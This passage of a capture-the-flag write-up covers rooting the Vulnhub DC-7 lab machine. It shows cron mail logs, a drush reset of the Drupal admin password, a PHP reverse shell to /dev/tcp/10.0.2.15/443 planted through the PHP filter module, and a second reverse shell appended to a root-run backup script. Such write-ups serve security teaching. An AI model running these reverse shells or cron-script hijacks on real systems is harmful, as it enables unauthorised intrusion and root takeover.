MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph7lH-0000Nd-0x@dc-7>
Date: Tue, 28 Mar 2023 21:45:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 22:00:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 22:00:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph7zm-0000Oa-AG
        for root@dc-7; Tue, 28 Mar 2023 22:00:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph7zm-0000Oa-AG@dc-7>
Date: Tue, 28 Mar 2023 22:00:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 22:15:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 22:15:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph8EI-0000QN-SD
        for root@dc-7; Tue, 28 Mar 2023 22:15:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph8EI-0000QN-SD@dc-7>
Date: Tue, 28 Mar 2023 22:15:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 22:30:11 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 22:30:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph8Sp-0000RV-Ak
        for root@dc-7; Tue, 28 Mar 2023 22:30:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph8Sp-0000RV-Ak@dc-7>
Date: Tue, 28 Mar 2023 22:30:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 22:45:11 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 22:45:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph8hL-0000TI-9v
        for root@dc-7; Tue, 28 Mar 2023 22:45:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph8hL-0000TI-9v@dc-7>
Date: Tue, 28 Mar 2023 22:45:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 23:00:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 23:00:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph8vq-0000UN-R5
        for root@dc-7; Tue, 28 Mar 2023 23:00:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph8vq-0000UN-R5@dc-7>
Date: Tue, 28 Mar 2023 23:00:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 23:15:11 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 23:15:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph9AN-0000WA-HQ
        for root@dc-7; Tue, 28 Mar 2023 23:15:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph9AN-0000WA-HQ@dc-7>
Date: Tue, 28 Mar 2023 23:15:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 23:30:30 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 23:30:30 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph9P2-0000XK-Gb
        for root@dc-7; Tue, 28 Mar 2023 23:30:20 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph9P2-0000XK-Gb@dc-7>
Date: Tue, 28 Mar 2023 23:30:20 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

```

Every 15 minutes a backup is created and an email is sent to the dc7user.
The backup script is probably located here `/opt/scripts/backups.sh`
Let's check the permissions on that file.
```bash
dc7user@dc-7:~$ ls -la /opt/scripts/backups.sh
-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh

```
Well the script can be edited by members in the ww-data group. Now let's see what the script is doing.
```bash
dc7user@dc-7:~$ cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz

```
There is a tool drush called in the script to dump a SQL database. That does sound interesting to me.


While using some Google Fu, I found some information about drush.
```
Drush is a command line shell and Unix scripting interface for Drupal. Drush core ships with lots of useful commands and generators.
```

So let's see what we can do with this tool.
```bash
dc7user@dc-7:~$ drush 
Execute a drush command. Run `drush help [command]` to view command-specific help.  Run `drush topic` to read even more documentation.

Global options (see `drush topic core-global-options` for the full list):
 -d, --debug                               Display even more information, including internal messages.                                                 
 -h, --help                                This help system.                                                                                           
 -n, --no                                  Assume 'no' as answer to all prompts.                                                                       
 -r <path>, --root=<path>                  Drupal root directory to use (default: current directory).                                                  
 -s, --simulate                            Simulate all relevant actions (don't actually change the system).                                           
 -l <http://example.com:8888>,             URI of the drupal site to use (only needed in multisite environments or when running on an alternate port). 
 --uri=<http://example.com:8888>                                                                                                                       
 -v, --verbose                             Display extra information about the command.                                                                
 -y, --yes                                 Assume 'yes' as answer to all prompts.

Core Drush commands: (core)
 archive-dump (ard,    Backup your code, files, and database into a single file.                                      
 archive-backup, arb,                                                                                                 
 archive:dump)                                                                                                        
 archive-restore       Expand a site archive into a Drupal web site.                                                  
 (arr,                                                                                                                
 archive:restore)                                                                                                     
 core-cli (php,        Open an interactive shell on a Drupal site.                                                    
 core:cli)                                                                                                            
 core-config (conf,    Edit drushrc, site alias, and Drupal settings.php files.                                       
 config, core:config)                                                                                                 
 core-cron (cron,      Run all cron hooks in all active modules for specified site.                                   
 core:cron)                                                                                                           
 core-execute (exec,   Execute a shell command. Usually used with a site alias.                                       
 execute,                                                                                                             
 core:execute)                                                                                                        
 core-init (init,      Enrich the bash startup file with completion and aliases. Copy .drushrc file to ~/.drush       
 core:init)                                                                                                           
 core-quick-drupal     Download, install, serve and login to Drupal with minimal configuration and dependencies.      
 (qd, cutie,                                                                                                          
 core:quick:drupal)                                                                                                   
 core-requirements     Provides information about things that may be wrong in your Drupal installation, if any.       
 (status-report, rq,                                                                                                  
 core:requirements)                                                                                                   
 core-rsync (rsync,    Rsync the Drupal tree to/from another server using ssh.                                        
 core:rsync)                                                                                                          
 core-status (status,  Provides a birds-eye view of the current Drupal installation, if any.                          
 st, core:status)                                                                                                     
 core-topic (topic,    Read detailed documentation on a given topic.                                                  
 core:topic)                                                                                                          
 do:sanitize           Performs database sanitization.                                                                
 (do-sanitize)                                                                                                        
 drupal-directory      Return the filesystem path for modules/themes and other key folders.                           
 (dd,                                                                                                                 
 drupal:directory)                                                                                                    
 entity-updates        Apply pending entity schema updates.                                                           
 (entup,                                                                                                              
 entity:updates)                                                                                                      
 help                  Print this help message. See `drush help help` for more options.                               
 image-derive (id,     Create an image derivative.                                                                    
 image:derive)                                                                                                        
 image-flush (if,      Flush all derived images for a given style.                                                    
 image:flush)                                                                                                         
 new-status                                                                                                           
 php-eval (eval, ev,   Evaluate arbitrary php code after bootstrapping Drupal (if available).                         
 php:eval)                                                                                                            
 php-script (scr,      Run php script(s).                                                                             
 php:script)                                                                                                          
 queue-list            Returns a list of all defined queues                                                           
 queue-run             Run a specific queue by name                                                                   
 (queue:run)                                                                                                          
 sanitize:comments     Sanitizes comments_field_data table.                                                           
 (sanitize-comments)                                                                                                  
 sanitize:sessions     Truncates the session table.                                                                   
 (sanitize-sessions)                                                                                                  
 sanitize:table-colum  Replaces all values in given table column with the specified value.                            
 n                                                                                                                    
 (sanitize-table-colu                                                                                                 
 mn)                                                                                                                  
 sanitize:user-fields  Sanitize string fields associated with the user.                                               
 (sanitize-user-field                                                                                                 
 s)                                                                                                                   
 shell-alias (sha,     Print all known shell alias records.                                                           
 shell:alias)                                                                                                         
 site-alias (sa,       Print site alias records for all known site aliases and local sites.                           
 site:alias)                                                                                                          
 site-install (si,     Install Drupal along with modules/themes/configuration using the specified install profile.    
 site:install)                                                                                                        
 site-set (use,        Set a site alias to work on that will persist for the current session.                         
 site:set)                                                                                                            
 site-ssh (ssh,        Connect to a Drupal site's server via SSH for an interactive session or to run a shell command 
 site:ssh)                                                                                                            
 sql-sanitize          Run sanitization operations on the current database.                                           
 (sqlsan)                                                                                                             
 twig-compile (twigc,  Compile all Twig template(s).                                                                  
 twig:compile)                                                                                                        
 updatedb (updb)       Apply any database updates required (as with running update.php).                              
 updatedb-status       List any pending database updates.                                                             
 (updbst,                                                                                                             
 updatedb:status)                                                                                                     
 variable-delete       Delete a variable.                                                                             
 (vdel,                                                                                                               
 variable:delete)                                                                                                     
 variable-get (vget,   Get a list of some or all site variables and values.                                           
 variable:get)                                                                                                        
 variable-set (vset,   Set a variable.                                                                                
 variable:set)                                                                                                        
 version               Show drush version.                                                                            
 wrap:table-name       Wraps a table name in brackets if a database prefix is being used.                             
 (wrap-table-name)
Cache commands: (cache)
 cache-clear (cc,    Clear a specific cache, or all drupal caches.             
 cache:clear)                                                                  
 cache-get (cg,      Fetch a cached object and display it.                     
 cache:get)                                                                    
 cache-rebuild (cr,  Rebuild a Drupal 8 site and clear all its caches.         
 rebuild,                                                                      
 cache:rebuild)                                                                
 cache-set (cs,      Cache an object expressed in JSON or var_export() format. 
 cache:set)
Config commands: (config)
 config-delete (cdel,  Delete a configuration object.                                                                          
 config:delete)                                                                                                                
 config-edit (cedit,   Open a config file in a text editor. Edits are imported into active configuration after closing editor. 
 config:edit)                                                                                                                  
 config-export (cex,   Export configuration to a directory.                                                                    
 config:export)                                                                                                                
 config-get (cget,     Display a config value, or a whole configuration object.                                                
 config:get)                                                                                                                   
 config-import (cim,   Import config from a config directory.                                                                  
 config:import)                                                                                                                
 config-list (cli,     List config names by prefix.                                                                            
 config:list)                                                                                                                  
 config-pull (cpull,   Export and transfer config from one environment to another.                                             
 config:pull)                                                                                                                  
 config-set (cset,     Set config value directly. Does not perform a config import.                                            
 config:set)
Field commands: (field)
 field-clone           Clone a field and all its instances.                         
 (field:clone)                                                                      
 field-create          Create fields and instances. Returns urls for field editing. 
 (field:create)                                                                     
 field-delete          Delete a field and its instances.                            
 (field:delete)                                                                     
 field-info            View information about fields, field_types, and widgets.     
 field-update          Return URL for field editing web page.                       
 (field:update)
Make commands: (make)
 make                  Turns a makefile into a working Drupal codebase.                                                                  
 make-convert          Convert a legacy makefile into another format. Defaults to converting .make => .make.yml.                         
 make-generate         Generate a makefile from the current Drupal site.                                                                 
 (generate-makefile)                                                                                                                     
 make-lock             Process a makefile and outputs an equivalent makefile with projects version *resolved*. Respects pinned versions. 
 make-update           Process a makefile and outputs an equivalent makefile with projects version resolved to latest available.
Project manager commands: (pm)
 pm-disable (dis,     Disable one or more extensions (modules or themes).                                                                
 pm:disable)                                                                                                                             
 pm-download (dl,     Download projects from drupal.org or other sources.                                                                
 pm:download)                                                                                                                            
 pm-enable (en,       Enable one or more extensions (modules or themes).                                                                 
 pm:enable)                                                                                                                              
 pm-info (pmi,        Show detailed info for one or more extensions (modules or themes).                                                 
 pm:info)                                                                                                                                
 pm-list (pml,        Show a list of available extensions (modules and themes).                                                          
 pm:list)                                                                                                                                
 pm-projectinfo       Show a report of available projects and their extensions.                                                          
 (pmpi,                                                                                                                                  
 pm:projectinfo)                                                                                                                         
 pm-refresh (rf,      Refresh update status information.                                                                                 
 pm:refresh)                                                                                                                             
 pm-releasenotes      Print release notes for given projects.                                                                            
 (rln,                                                                                                                                   
 pm:releasenotes)                                                                                                                        
 pm-releases (rl,     Print release information for given projects.                                                                      
 pm:releases)                                                                                                                            
 pm-uninstall (pmu,   Uninstall one or more modules and their dependent modules.                                                         
 pm:uninstall)                                                                                                                           
 pm-update (up,       Update Drupal core and contrib projects and apply any pending database updates (Same as pm-updatecode + updatedb). 
 pm:update)                                                                                                                              
 pm-updatecode (upc,  Update Drupal core and contrib projects to latest recommended releases.                                            
 pm:updatecode)                                                                                                                          
 pm-updatestatus      Show a report of available minor updates to Drupal core and contrib projects.                                      
 (ups,                                                                                                                                   
 pm:updatestatus)
Role commands: (role)
 role-add-perm (rap,  Grant specified permission(s) to a role.                                                                                                                                                                            
 role:add:perm)                                                                                                                                                                                                                           
 role-create (rcrt,   Create a new role.                                                                                                                                                                                                  
 role:create)                                                                                                                                                                                                                             
 role-delete (rdel,   Delete a role.                                                                                                                                                                                                      
 role:delete)                                                                                                                                                                                                                             
 role-list (rls,      Display a list of all roles defined on the system.  If a role name is provided as an argument, then all of the permissions of that role will be listed.  If a permission name is provided as an option, then all of 
 role:list)           the roles that have been granted that permission will be listed.                                                                                                                                                    
 role-remove-perm     Remove specified permission(s) from a role.                                                                                                                                                                         
 (rmp,                                                                                                                                                                                                                                    
 role:remove:perm)
Runserver commands: (runserver)
 runserver (rs)        Runs PHP's built-in http server for development.
SQL commands: (sql)
 sql-cli (sqlc,        Open a SQL command-line interface using Drupal's credentials.                                            
 sql:cli)                                                                                                                       
 sql-connect           A string for connecting to the DB.                                                                       
 (sql:connect)                                                                                                                  
 sql-create            Create a database.                                                                                       
 (sql:create)                                                                                                                   
 sql-drop (sql:drop)   Drop all tables in a given database.                                                                     
 sql-dump (sql:dump)   Exports the Drupal DB as SQL using mysqldump or equivalent.                                              
 sql-query (sqlq,      Execute a query against a database.                                                                      
 sql:query)                                                                                                                     
 sql-sync              Copies the database contents from a source site to a target site. Transfers the database dump via rsync.
Search commands: (search)
 search-index          Index the remaining search items without wiping the index. 
 search-reindex        Force the search index to be rebuilt.                      
 (search:index)                                                                   
 search-status         Show how many items remain to be indexed out of the total.
State commands: (state)
 state-delete (sdel,  Delete a state value.  
 state:delete)                               
 state-get (sget,     Display a state value. 
 state:get)                                  
 state-set (sset,     Set a state value.     
 state:set)
User commands: (user)
 user-add-role (urol,  Add a role to the specified user accounts.                                    
 user:add:role)                                                                                      
 user-block (ublk,     Block the specified user(s).                                                  
 user:block)                                                                                         
 user-cancel (ucan,    Cancel a user account with the specified name.                                
 user:cancel)                                                                                        
 user-create (ucrt,    Create a user account with the specified name.                                
 user:create)                                                                                        
 user-information      Print information about the specified user(s).                                
 (uinf,                                                                                              
 user:information)                                                                                   
 user-login (uli,      Display a one time login link for the given user account (defaults to uid 1). 
 user:login)                                                                                         
 user-password (upwd,  (Re)Set the password for the user account with the specified name.            
 user:password)                                                                                      
 user-remove-role      Remove a role from the specified user accounts.                               
 (urrol,                                                                                             
 user:remove:role)                                                                                   
 user-unblock (uublk,  Unblock the specified user(s).                                                
 user:unblock)
Watchdog commands: (watchdog)
 watchdog-delete      Delete watchdog messages.                                                                                   
 (wd-del, wd-delete,                                                                                                              
 watchdog:delete)                                                                                                                 
 watchdog-list        Show available message types and severity levels. A prompt will ask for a choice to show watchdog messages. 
 (wd-list,                                                                                                                        
 watchdog:list)                                                                                                                   
 watchdog-show        Show watchdog messages.                                                                                     
 (wd-show, ws,                                                                                                                    
 watchdog:show)

```
It looks like we can reset a password with drush for a Drupal user. Now let's try to reset the password for the admin in Drupal. Let's [Google](https://www.google.com/search?q=drush+password+reset) a bit more.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328201506.png){: width="700" height="400" }

```bash
dc7user@dc-7:~$ drush upwd admin --password=newpassword
Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                       [error]
The drush command 'upwd admin' could not be executed. 
```
It did not work since the command should run from a more functional Drupal environment. Let's change our working directory and try again
```bash
dc7user@dc-7:~$ cd /var/www/html/
You have new mail in /var/mail/dc7user
dc7user@dc-7:/var/www/html$ drush upwd admin --password=”newpassword”
Changed password for admin                                             
```
So the password has been changed for the admin user of Drupal.
Now we can logon to Drupal, gain a reverse shell and then we have to adjust the backup script with a reverse shell code to gain privileges as root.

Before doing this I would like to enumerate the Linux and Kernel version.

```bash
dc7user@dc-7:~$ uname -a
Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux
dc7user@dc-7:~$ uname -mrs
Linux 4.9.0-9-amd64 x86_64
dc7user@dc-7:~$ cat /etc/issue
Debian GNU/Linux 9 \n \l
Please enjoy your stay.

eth0: \4{eth0}
dc7user@dc-7:~$ cat /proc/version
Linux version 4.9.0-9-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11)
You have new mail in /var/mail/dc7user
dc7user@dc-7:~$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
dc7user@dc-7:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.9 (stretch)
Release:        9.9
Codename:       stretch
dc7user@dc-7:~$ 


```
Noe let's browse to the website again and logon with the new password for the admin.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328201807.png){: width="700" height="400" }

Now logon with the credentials `admin:newpassword` 
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328202215.png){: width="700" height="400" }

It worked! Now it is time to gain a reverse shell via Drupal.
Click on the option `Extend` .
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328202524.png){: width="700" height="400" }

Now click on the button `Install new module`.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328202747.png){: width="700" height="400" }

Enter the URL for the PHP filter module within drupal.
```URL
https://www.drupal.org/project/php
```
And then click on the `Install` button.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328204149.png){: width="700" height="400" }

It failed... Let's go back to the website and look for the direct link.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328205104.png){: width="700" height="400" }

There is a release page, let's open this one.
```URL
https://www.drupal.org/project/php/releases/8.x-1.1
```
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328204948.png){: width="700" height="400" }

Copy the link.
```URL
https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328205331.png){: width="700" height="400" }

Paste the URL and click on `Install` again and wait a bit.

![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328205225.png){: width="700" height="400" }

It looks like the PHP filter module has been installed. Before we can create a PHP reverse web shell we have to activate the module.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328205834.png){: width="700" height="400" }

Click on `Extend` search for `PHP`, then check the checkbox at `PHP Filter` and hit the `Install` button. 
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328210017.png){: width="700" height="400" }

Now we can create a page with a PHP reverse web shell.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328205457.png){: width="700" height="400" }

Click `Add content`.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328205529.png){: width="700" height="400" }

Click on `Basic page`.

Start a netcat listener on port 443.
``` bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ sudo nc -lvp 443                
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
``` 


First set the text format to `PHP code`, then enter the title `shell`
Add the following PHP code into the body field.
```PHP
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/443 0>&1'");?>
```
And hit the `Preview` button

``` bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ sudo nc -lvp 443                
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.0.2.37.
Ncat: Connection from 10.0.2.37:43248.
bash: cannot set terminal process group (406): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dc-7:/var/www/html$ 
``` 
The reverse shell what I like to use now is:
```bash
sh -i >& /dev/tcp/10.0.2.15/53 0>&1
``` 
To enter this in the `backups.sh` file I use the `echo` command and append it to the script.

```bash
www-data@dc-7:/var/www/html$ echo 'sh -i >& /dev/tcp/10.0.2.15/53 0>&1' >> /opt/scripts/backups.sh
<v/tcp/10.0.2.15/53 0>&1' >> /opt/scripts/backups.sh
www-data@dc-7:/var/www/html$ 

``` 
Start a netcat listener on port 53.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ sudo nc -lvp 53                 
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
``` 
Now we have to wait. Every 15 minutes a job is started according the emails... So be patient.


## Privilege escalation

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ sudo nc -lvp 53                 
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.0.2.37.
Ncat: Connection from 10.0.2.37:41404.
sh: 0: can't access tty; job control turned off
# 
```
It looks like there is a connection established. Let's check if we are root.
If we are root we can capture the flag!
```bash
# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
dc-7
# cd /root
# ls
theflag.txt
# whoami;id;hostname;ifconfig;cat theflag.txt
root
uid=0(root) gid=0(root) groups=0(root)
dc-7
sh: 4: ifconfig: not found




888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.

# 
``` 
